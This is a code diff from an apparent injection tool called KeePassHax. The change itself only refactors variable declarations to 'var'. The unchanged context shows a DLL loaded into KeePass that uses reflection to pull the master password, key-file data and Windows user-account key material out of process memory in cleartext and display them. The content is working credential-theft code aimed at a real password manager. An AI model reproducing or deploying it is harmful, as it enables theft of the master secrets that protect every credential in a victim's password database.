@@ -28,8 +28,8 @@ namespace KeePassHax
             MessageBox.Show("Loading from injected DLL!", "Test");
 
             // Try to get the entry assembly, and find the Program class
-            Assembly asm = Assembly.GetEntryAssembly();
-            Type programType = asm.EntryPoint.DeclaringType;
+            var asm = Assembly.GetEntryAssembly();
+            var programType = asm.EntryPoint.DeclaringType;
 
             // Get the main form
             var mainForm = programType.GetFieldStatic("m_formMain");
@@ -42,8 +42,7 @@ namespace KeePassHax
 
             // Get all items that make up the CompositeKey
             var userKeys = (IList)compositeKey.GetFieldInstance("m_vUserKeys");
-            foreach (object key in userKeys) {
-
+            foreach (var key in userKeys) {
                 // Do something different depending on what kind of user key we get
                 switch (key.GetType().Name) {
                     case "KcpPassword":
@@ -51,7 +50,7 @@ namespace KeePassHax
                         var passProt = key.GetFieldInstance("m_psPassword");
 
                         // Invoke the ReadString function, which returns a plaintext string
-                        string cleartext = (string)passProt.RunMethodInstance("ReadString");
+                        var cleartext = (string)passProt.RunMethodInstance("ReadString");
                         MessageBox.Show("Extracted password:\n" + cleartext, key.GetType().Name);
                         break;
                     case "KcpKeyFile":
@@ -64,7 +63,7 @@ namespace KeePassHax
                         // So technically, we don't even need to extract this one from the current process, since it's accessible by any program 
                         // running in this user's context. But just for good measure (and to keep code simple), I'll extract this from memory too.
                         var userAccData = key.GetFieldInstance("m_pbKeyData");
-                        byte[] userAccDataClear = (byte[])userAccData.RunMethodInstance("ReadData");
+                        var userAccDataClear = (byte[])userAccData.RunMethodInstance("ReadData");
                         MessageBox.Show("Extracted UserAccount data:\n" + string.Join("-", userAccDataClear.Select(x => x.ToString("X2"))), key.GetType().Name);
                         break;
                 }
